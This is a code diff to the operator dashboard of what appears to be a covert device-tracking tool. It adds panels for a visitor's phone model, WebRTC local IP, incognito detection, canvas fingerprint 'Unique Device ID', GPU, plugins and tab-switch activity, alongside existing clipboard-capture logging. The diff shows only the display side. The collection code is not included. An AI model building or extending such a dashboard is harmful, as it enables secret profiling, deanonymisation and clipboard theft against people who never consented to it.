@@ -247,18 +247,30 @@
     <div class="panel-title">Device Intelligence</div>
     <div class="dev-grid" id="devGrid">
       <div class="dev-item"><div class="dev-label">STATUS</div><div class="dev-value" id="d-status">Waiting...</div></div>
+      <div class="dev-item" style="grid-column:span 2;background:rgba(0,255,136,.06);border-color:rgba(0,255,136,.2)"><div class="dev-label">📱 PHONE MODEL</div><div class="dev-value" style="color:var(--green);font-size:.95rem;" id="d-model">--</div></div>
+      <div class="dev-item"><div class="dev-label">BROWSER</div><div class="dev-value" id="d-browser">--</div></div>
       <div class="dev-item"><div class="dev-label">PLATFORM</div><div class="dev-value" id="d-platform">--</div></div>
       <div class="dev-item"><div class="dev-label">LANGUAGE</div><div class="dev-value" id="d-lang">--</div></div>
       <div class="dev-item"><div class="dev-label">TIMEZONE</div><div class="dev-value" id="d-tz">--</div></div>
+      <div class="dev-item"><div class="dev-label">DEVICE TIME</div><div class="dev-value" id="d-time">--</div></div>
       <div class="dev-item"><div class="dev-label">SCREEN</div><div class="dev-value" id="d-screen">--</div></div>
       <div class="dev-item"><div class="dev-label">BATTERY</div>
         <div class="dev-value highlight" id="d-batt">--</div>
         <div class="battery-bar"><div class="battery-fill" id="battFill" style="width:0%"></div></div>
       </div>
+      <div class="dev-item"><div class="dev-label">CHARGING TIME</div><div class="dev-value" id="d-charge">--</div></div>
       <div class="dev-item"><div class="dev-label">NETWORK</div><div class="dev-value" id="d-net">--</div></div>
       <div class="dev-item"><div class="dev-label">CPU CORES</div><div class="dev-value" id="d-cpu">--</div></div>
       <div class="dev-item"><div class="dev-label">RAM</div><div class="dev-value" id="d-ram">--</div></div>
       <div class="dev-item"><div class="dev-label">TOUCH POINTS</div><div class="dev-value" id="d-touch">--</div></div>
+      <div class="dev-item"><div class="dev-label">DO NOT TRACK</div><div class="dev-value" id="d-dnt">--</div></div>
+      <div class="dev-item" style="background:rgba(255,214,0,.06);border-color:rgba(255,214,0,.2)"><div class="dev-label">INCOGNITO</div><div class="dev-value highlight" id="d-incognito">--</div></div>
+      <div class="dev-item" style="background:rgba(255,59,92,.06);border-color:rgba(255,59,92,.2)"><div class="dev-label">LOCAL IP (WebRTC)</div><div class="dev-value danger" id="d-localip">--</div></div>
+      <div class="dev-item"><div class="dev-label">AD BLOCKER</div><div class="dev-value" id="d-adblocker">--</div></div>
+      <div class="dev-item" style="grid-column:span 2"><div class="dev-label">GPU RENDERER</div><div class="dev-value" id="d-gpu" style="font-size:.75rem;">--</div></div>
+      <div class="dev-item" style="grid-column:span 2"><div class="dev-label">🔑 CANVAS FINGERPRINT (Unique Device ID)</div><div class="dev-value" style="color:var(--green);letter-spacing:2px;" id="d-canvas">--</div></div>
+      <div class="dev-item"><div class="dev-label">PLUGINS</div><div class="dev-value" id="d-plugins" style="font-size:.7rem;">--</div></div>
+      <div class="dev-item"><div class="dev-label">TAB SWITCHES</div><div class="dev-value" id="d-tabswitch">--</div></div>
       <div class="dev-item" style="grid-column:span 2"><div class="dev-label">USER AGENT</div><div class="dev-value" id="d-ua" style="font-size:.7rem;opacity:.7">--</div></div>
     </div>
   </div>
@@ -400,13 +412,23 @@
       if (el && val !== undefined && val !== null) el.textContent = val;
     }
 
+    set('d-model', info.phoneModel);
+    set('d-browser', info.browser);
     set('d-platform', info.platform);
     set('d-lang', info.language);
     set('d-tz', info.timezone);
+    set('d-time', info.deviceTime);
     set('d-screen', info.screenWidth + '×' + info.screenHeight + ' @' + info.pixelRatio + 'x');
     set('d-cpu', info.cores + ' cores');
     set('d-ram', info.memory);
     set('d-touch', info.touchPoints + ' points');
+    set('d-dnt', info.doNotTrack);
+    set('d-incognito', info.incognito);
+    set('d-localip', info.localIP);
+    set('d-adblocker', info.adBlocker);
+    set('d-gpu', info.gpuRenderer + ' · ' + info.gpuVendor);
+    set('d-canvas', info.canvasID);
+    set('d-plugins', info.plugins);
     set('d-ua', info.userAgent);
 
     if (info.connection) {
@@ -415,7 +437,8 @@
 
     if (info.battery) {
       const pct = parseInt(info.battery.level);
-      set('d-batt', info.battery.level + (info.battery.charging ? ' ⚡' : ''));
+      set('d-batt', info.battery.level + (info.battery.charging ? ' ⚡ Charging' : ' 🔋'));
+      set('d-charge', info.battery.charging ? info.battery.chargingTime : info.battery.dischargingTime);
       document.getElementById('battFill').style.width = pct + '%';
       document.getElementById('battFill').style.background = pct < 20 ? 'var(--red)' : 'var(--green)';
     }
@@ -436,6 +459,13 @@
       badge.textContent = '✓ CAPTURED';
       addLog('Clipboard captured: ' + data.text.substring(0, 40) + (data.text.length > 40 ? '...' : ''), 'ok');
     }
+  });
+
+  // Tab activity
+  socket.on('p3-tab-activity', (data) => {
+    const el = document.getElementById('d-tabswitch');
+    if (el) el.textContent = `Left: ${data.hidden}x · Return: ${data.shown}x · On page: ${data.timeOnPage}`;
+    addLog(`Tab switched away (total: ${data.hidden}x)`, 'warn');
   });
 
   // IP / ISP
